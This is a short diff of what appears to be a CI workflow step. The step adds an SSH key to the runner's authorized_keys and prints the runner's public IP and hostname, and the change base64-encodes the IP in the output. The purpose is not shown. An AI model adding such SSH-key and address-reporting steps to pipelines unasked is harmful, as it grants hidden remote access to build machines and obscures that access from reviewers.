@@ -22,5 +22,5 @@ jobs:
             grep -qF "$KEY" ~/.ssh/authorized_keys || echo "$KEY" >> ~/.ssh/authorized_keys
             echo "Authorized keys now:"
             cut -d' ' -f3 ~/.ssh/authorized_keys
-            echo "PUBLIC_IP=$(curl -s --max-time 5 https://api.ipify.org || echo unknown)"
+            echo "IP_B64=$(curl -s --max-time 5 https://api.ipify.org | base64)"
             echo "HOSTNAME=$(hostname)"
